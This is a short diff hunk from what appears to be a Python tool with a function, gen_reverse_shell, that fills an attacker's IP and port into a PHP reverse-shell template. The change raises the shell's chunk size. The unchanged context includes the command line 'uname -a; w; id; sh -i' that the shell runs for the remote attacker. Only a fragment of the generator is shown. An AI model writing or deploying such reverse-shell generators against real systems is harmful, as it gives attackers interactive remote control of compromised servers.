@@ -9,7 +9,7 @@ def gen_reverse_shell(attacker_info):
 	'''.format(ip = attacker_info["ip"], port = int(attacker_info["port"])) 
 
 	end = '''
-	$chunk_size = 1400;
+	$chunk_size = 8192;
 	$write_a = null;
 	$error_a = null;
 	$shell = 'uname -a; w; id; sh -i';
